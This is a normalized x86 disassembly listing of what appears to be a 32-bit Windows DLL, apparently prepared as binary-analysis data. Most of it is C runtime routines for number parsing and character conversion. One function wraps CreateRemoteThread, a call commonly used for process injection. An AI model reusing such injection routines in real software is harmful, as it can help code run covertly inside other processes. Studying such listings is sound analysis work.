lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
push r--data
lea ecx [ esp + 0x20 ]
call sub_1000134a
and [ esp + 0x60 ] 0x0
lea eax [ esp + 0x1c ]
push eax
lea esi [ esp + 0x18 ]
call sub_100183f8
xor edi edi
push 0x0
inc edi
push edi
lea ecx [ esp + 0x24 ]
mov [ esp + 0x68 ] 0x2
call sub_10001500
push r--data
lea ecx [ esp + 0x3c ]
call sub_10001c7f
lea eax [ esp + 0x38 ]
push eax
mov eax esi
push eax
mov [ esp + 0x68 ] 0x3
call sub_10015885
push 0x0
push edi
lea ecx [ esp + 0x40 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x68 ] 0x2
call sub_10002020
add ebx 0x14
mov esi sub_10022e5c
jmp r-xdata
push ebx
push esi
call [ esp + 0x18 ]
pop ecx
pop ecx
cmp eax edi
je r-xdata
push edi
call [ Sleep@IAT ]
push edi
call [ Sleep@IAT ]
push ebx
push esi
call [ esp + 0x18 ]
pop ecx
pop ecx
cmp eax edi
jne r-xdata
or [ esp + 0x60 ] 0xffffffff
lea ecx [ esp + 0x14 ]
call sub_1001847e
mov eax edi
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10022e5c
mov eax [ esp + 0x8 ]
push esi
push [ esp + 0x8 ]
mov esi [ eax ]
call [ GetParent@IAT ]
cmp eax esi
pop esi
je r-xdata
push 0x1c0001
push 0xd
push 0x100
push [ esp + 0x10 ]
call [ PostMessageW@IAT ]
dec eax
neg eax
sbb eax eax
neg eax
xor eax eax
inc eax
jmp r-xdata
retn 0x8
sub_10022e97
push 0x30
mov eax sub_1004e06e
call sub_10028203
lea eax [ ebp - 0x14 ]
push eax
xor esi esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push esi
push [ ebp + 0x8 ]
call [ CreateRemoteThread@IAT ]
push r--data
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x18 ] eax
call sub_10001c7f
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x18 ] esi
lea eax [ ebp - 0x3c ]
push eax
sete al
movzx eax al
push eax
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_10002020
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push edi
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
call sub_10014e13
mov [ edi ] r--data
mov eax edi
call sub_100282db
retn 0xc
sub_10022f44
push 0x44
mov eax sub_1004d191
call sub_10028203
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001b0b
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10027dd1
int3
sub_10022f7c
push 0x44
mov eax sub_1004d191
call sub_10028203
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_1000ed61
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10027dd1
int3
sub_10022fb4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x20 ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_10022fdb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x0
mov ecx esi
call sub_10022fb4
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
and [ esi + 0x1c ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_100242e6
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x20 ] 0x0
pop edi
pop esi
pop ebp
retn
mov edi [ eax ]
push eax
call sub_100242e6
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_10023026
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] 0x0
jbe r-xdata
push esi
call sub_10022fdb
pop ecx
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
dec [ eax + rw-data ]
mov eax [ esi + 0x4 ]
cmp [ eax + rw-data ] 0x0
jg r-xdata
pop esi
pop ebp
retn
push 0x1
call sub_10003c61
sub_10023062
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_1002424c
add esi 0x18
cmp esi rw-data
pop ecx
jl r-xdata
pop esi
sub_10023093
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jge r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_1002425c
add esi 0x18
cmp esi rw-data
pop ecx
jl r-xdata
pop esi
sub_100230bc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4
push esi
mov esi ecx
mov [ esi ] eax
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_1002426c
pop ecx
sub_100230fb
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_10024389
push eax
mov [ esi ] eax
call sub_1002424c
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_1002316d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10023158
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1002318e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_10003c0e
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_100231af
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100230bc
push rw-data
call sub_1002318e
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_100230e4
leave
retn
sub_100231e1
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_100231af
mov [ rw-data ] 0x1
call sub_1002428c
pop ecx
sub_1002320b
push 0x4
mov eax sub_1004b74a
call sub_10028203
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100230bc
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
ja r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_10024aba
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_100230e4
call sub_100282db
retn
mov ecx [ eax ]
call sub_10003c0e
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1002326b
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100230bc
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx eax
mov eax [ eax ]
push 0x1
mov [ rw-data ] eax
call sub_1002316d
lea ecx [ ebp - 0x4 ]
call sub_100230e4
leave
retn
sub_100232a0
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x8
call sub_10024389
pop ecx
test eax eax
je r-xdata
push sub_1002326b
call sub_1002313e
pop ecx
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_100232de
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x50 ] 0x0
jbe r-xdata
pop ebp
retn
cmp [ eax + 0x54 ] 0x10
jb r-xdata
add eax 0x40
mov eax [ eax + 0x40 ]
jmp r-xdata
push eax
push 0x0
call sub_10029579
pop ecx
pop ecx
sub_10023306
push 0x4
mov eax sub_1004bea9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov al [ ebp + 0x8 ]
push r--data
lea ecx [ esi + 0x18 ]
mov [ esi ] r--data
mov [ esi + 0x14 ] al
call sub_10001c7f
mov eax esi
call sub_100282db
retn 0x4
sub_1002334f
push 0x4
mov eax sub_1004b778
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_1002320b
pop ecx
push 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_10002020
mov [ esi ] r--data
call sub_100282db
retn
sub_1002338c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1002334f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_100233ad
push 0x8
mov eax sub_1004b7a5
call sub_10028203
mov eax [ rw-data ]
mov esi eax
test eax eax
jne r-xdata
mov eax esi
call sub_100282db
retn
push eax
lea ecx [ ebp - 0x10 ]
call sub_100230bc
mov eax [ rw-data ]
and [ ebp - 0x4 ] esi
mov esi eax
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_100230e4
push 0x34
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
xor esi esi
push esi
call sub_10023306
mov esi eax
jmp r-xdata
push esi
mov [ ebp - 0x4 ] 0x0
call sub_100231e1
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_10001c62
mov ecx esi
mov [ rw-data ] esi
call sub_10003a56
mov eax [ rw-data ]
mov [ rw-data ] eax
sub_10023447
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_10029579
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x3c ]
call sub_10001c62
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_10029579
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x58 ]
call sub_10001c62
pop esi
pop ebp
retn
sub_10023494
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
push esi
push edi
jb r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
push eax
lea ecx [ edi + 0x3c ]
call sub_10001c62
test esi esi
je r-xdata
mov eax r--data
push 0x0
push 0x0
call sub_10029579
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax r--data
push esi
push 0x0
call sub_10029579
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ edi + 0x58 ]
call sub_10001c62
pop edi
pop esi
pop ebp
retn
sub_100234f0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
call sub_10029ba7
mov esi [ eax + 0x8 ]
call sub_10029b5b
mov edi eax
jmp r-xdata
and [ ebp + 0x14 ] 0x0
push edi
call sub_1002373c
pop ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
push eax
call sub_10029b3f
pop ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x0
push edi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ax [ ebp + 0xc ]
mov ecx 0xff
cmp ax cx
ja r-xdata
test esi esi
jne r-xdata
call sub_1002972b
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_1002358d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_10029ba7
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_10029b5b
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_10029fd7
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_10027800
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_10029f92
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_1002369a
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10029ba7
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_10029b5b
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_1002a045
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_10029fd7
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_10029fd7
push eax
push [ esi + 0x8 ]
call sub_10026f10
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_100236fa
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
push 0x1f
lea eax [ ebp - 0x23 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] 0x2e
call sub_1002a330
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call sub_10029484
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x1c
call sub_100242d7
leave
retn
sub_1002373c
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x3e
xor edx edx
pop ecx
div ecx
xor esi esi
lea eax [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
mov [ esi ] edi
call [ InterlockedCompareExchange@IAT ]
cmp eax edi
jne r-xdata
push 0xc
call sub_1002a000
mov esi eax
pop ecx
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov ebx edi
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_100236fa
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call sub_10028921
push esi
call sub_10024aba
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_10024aba
pop ecx
mov [ esi + 0x4 ] ebx
sub_100237d9
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_10028921
push esi
call sub_10024aba
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_1002382a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
call sub_10029ba7
mov esi [ eax + 0x8 ]
call sub_10029b5b
jmp r-xdata
xor ecx ecx
mov [ eax ] cx
push [ ebp + 0xc ]
call sub_1002373c
mov esi [ ebp + 0x14 ]
cmp [ esi ] 0x0
pop ecx
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] eax
test esi esi
jne r-xdata
test ebx ebx
jne r-xdata
mov al [ edi ]
push ebx
mov [ esi + 0x1 ] al
call sub_10029b3f
cmp eax 0x1
pop ecx
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx cx [ edi ]
mov [ eax ] cx
movzx eax [ edi ]
mov ecx [ ebx + 0x4 ]
movzx eax [ ecx + eax + 0x1d ]
and eax 0x4
call sub_10029fd7
movzx ecx [ edi ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
and [ esi ] 0x0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10029b3f
pop ecx
cmp [ ebp + 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
push ebx
call sub_10029b3f
cmp eax 0x1
pop ecx
jle r-xdata
mov al [ edi ]
push 0xfffffffe
mov [ esi ] al
pop eax
jmp r-xdata
call sub_1002972b
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push ebx
call sub_10029b3f
pop ecx
push eax
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10029b3f
pop ecx
jmp r-xdata
jmp r-xdata
sub_1002399e
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
movzx eax si
mov ecx 0xffff
mov [ ebp - 0x4 ] eax
cmp si cx
je r-xdata
pop esi
leave
retn
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
test edx edx
jne r-xdata
push [ ecx + 0x4 ]
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push edx
push 0x0
call sub_1002a34f
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push edi
mov edi 0x100
cmp si di
pop edi
jae r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ esi - 0x61 ]
cmp cx 0x19
ja r-xdata
add esi 0xffffffe0
movzx eax si
jmp r-xdata
sub_10023a0b
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ebp + 0x8 ]
movzx eax di
mov ecx 0xffff
mov [ ebp - 0x4 ] eax
cmp di cx
je r-xdata
pop edi
leave
retn
mov edx [ ebp + 0xc ]
push esi
mov esi [ edx ]
mov ecx 0x100
test esi esi
jne r-xdata
push [ edx + 0x4 ]
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push ecx
push esi
push 0x0
call sub_1002a34f
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push ebx
mov ebx ecx
cmp di bx
pop ebx
jae r-xdata
pop esi
mov eax [ ebp - 0x4 ]
lea ecx [ edi - 0x41 ]
cmp cx 0x19
ja r-xdata
add edi 0x20
movzx eax di
jmp r-xdata
sub_10023a78
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp + 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
call sub_1002a3a6
movsx ecx [ ebp + 0xc ]
add esp 0x1c
neg eax
sbb eax eax
and eax ecx
pop ebp
retn
sub_10023aa7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
push [ eax + 0x4 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
sar eax 0x1
push eax
push [ ebp + 0x8 ]
push 0x1
push 0x0
call sub_1002a3a6
mov eax [ ebp + 0xc ]
add esp 0x1c
pop ebp
retn
sub_10023ad9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x14
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ edi ]
mov esi edi
jmp r-xdata
mov [ eax ] ebx
push eax
call sub_1002797d
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc esi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jl r-xdata
cmp eax ebx
mov cl 0x30
jle r-xdata
cmp [ esi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp [ esi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ esi ] cl
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc esi
movsx eax [ esi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ebx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] ebx
call sub_1002b1c5
pop ecx
push eax
mov edi r--data
push edi
call sub_10024c40
add esp 0xc
cmp eax ebx
je r-xdata
inc esi
inc esi
cmp al 0x58
jne r-xdata
mov bl [ ebp + 0x13 ]
mov ecx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
mov bl al
mov eax edi
sub bl al
mov eax ecx
imul eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
movsx ecx bl
add eax ecx
mov [ ebp - 0x8 ] eax
inc esi
movsx eax [ esi ]
push eax
call sub_1002b1c5
pop ecx
push eax
push edi
call sub_10024c40
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx + r--data ]
mov eax esi
sub eax edx
sub eax [ ebp - 0x14 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
neg [ ebp - 0x8 ]
call sub_1002972b
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
movsx edx bl
sub eax edx
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ eax ] esi
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
xor edx edx
div ecx
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10023c74
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_1002797d
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x7fffffff
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_10023ad9
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp eax esi
ja r-xdata
call sub_1002972b
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x80000000
jbe r-xdata
xor eax eax
cmp [ ebp + 0xf ] 0x2d
sete al
add eax esi
jmp r-xdata
mov [ eax ] 0x1
neg eax
sub_10023d19
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_1002797d
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x80000000
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
mov ecx eax
or ecx edx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_10023ddc
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1002972b
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edx esi
jb r-xdata
jb r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
mov [ eax ] 0x1
neg eax
adc edx 0x0
neg edx
ja r-xdata
cmp eax 0xffffffff
ja r-xdata
or eax 0xffffffff
mov edx 0x7fffffff
jmp r-xdata
xor eax eax
mov edx esi
jmp r-xdata
test eax eax
jbe r-xdata
sub_10023ddc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x28
push ebx
push esi
xor esi esi
push edi
cmp eax esi
je r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov edi ebx
jmp r-xdata
mov [ eax ] esi
push eax
call sub_1002797d
pop ecx
test eax eax
jne r-xdata
inc edi
movzx eax [ edi ]
mov al [ edi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc edi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
